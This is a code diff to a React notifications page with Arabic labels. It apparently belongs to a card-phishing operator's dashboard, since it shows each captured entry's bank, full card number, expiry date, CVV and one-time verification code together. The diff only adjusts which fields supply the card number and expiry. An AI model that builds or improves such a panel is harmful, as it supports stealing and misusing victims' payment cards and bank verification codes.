@@ -1827,14 +1827,14 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: `${selectedNotification?.cardNumber} - ${selectedNotification?.prefix}`,
+                    value: `${selectedNotification?.cardNumber}`,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiryDate,
+                        : selectedNotification.cardExpiry,
                   },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
